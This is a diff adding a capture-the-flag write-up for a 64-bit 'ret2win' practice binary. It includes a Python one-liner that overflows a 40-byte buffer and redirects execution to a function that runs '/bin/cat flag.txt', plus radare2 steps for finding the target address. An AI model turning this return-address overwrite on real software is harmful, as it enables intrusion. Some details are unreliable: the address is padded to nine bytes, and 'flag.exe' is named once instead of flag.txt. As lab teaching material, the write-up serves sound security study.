@@ -1,0 +1,46 @@
+Exploit code:
+	Run python within a line:		python -c '
+	Print characters to output ROP string:	print(
+	Create a buffer of 40 Bytes:		"A" * 40  
+	Append string to the buffer:		+ 
+	Memory address of function in LSB:	"\x64\x07\x40\x00\x00\x00\x00\x00\x00")' 
+	Pipe ROP string to the program:		| ./ret2win
+Write-Up:
+	Filling The Buffer:
+		Using python to generate strings we can determine the size of the buffer we are targeting
+		By adjusting the number of characters in the string generated we can find how many characters we need to overflow the buffer
+			python -c 'print("A"*X)' where x = the size of the buffer
+		In this example we can determine that the buffer size is 40 bytes
+		This information can be used to create the padding for the ROP string
+
+	Targeting The Function:
+		The next step is determining the address of the function that we are trying to execute
+		Using radare2 we can dump the functions of the program using the command afl in radare2
+		This will result in a few interisting results such as ret2win and pwnme
+		In this challange we will be targeting the ret2win function to dump the contents of a file containing the flag
+		Changing the memory address in radare2 to the address of ret2win by using the s command in radare2
+			s sym.ret2win
+		To disassemble the function within radare2 use the pdf command this will show the assembly code of the function
+			0x00400756      55             push rbp
+			0x00400757      4889e5         mov rbp, rsp
+			0x0040075a      bf26094000     mov edi, str.Well_done__Here_s_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
+			0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
+			0x00400764      bf43094000     mov edi, str.bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
+			0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
+			0x0040076e      90             nop
+			0x0040076f      5d             pop rbp
+			0x00400770      c3             ret
+		This output gives us a good understanding on what is going on in this function and where to reference to dump the flag
+		using the memory address 0x400764 the prints the contents of flag.txt using /bin/cat
+		because the program we are attacking is a 64bit program the memory address is represented in 64 bits
+		0x000000000000400764
+		The program is also using least siginficant bit (LSB) or little-endian
+		this means that when writing the the ROP string we'll send the memory address reversed
+		640740000000000000
+	Creating the exploit:
+		Using the information gathered a ROP string can be created to dump the contents of flag.exe
+		combining the Padding of 40 bytes and the memory address will yield a working ROP string
+			AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x64 0x07 0x40 0x00 0x00 0x00 0x00 0x00 0x00
+		python is able to print raw hex bytes to the terminal, this will allow the program to read the string as hex instead of their ascii representation
+			python -c 'print("A"*40 + "\x64\x07\x40\x00\x00\x00\x00\x00\x00")'
+		piping the output of this to the program to the program will dump the contents of flag.txt
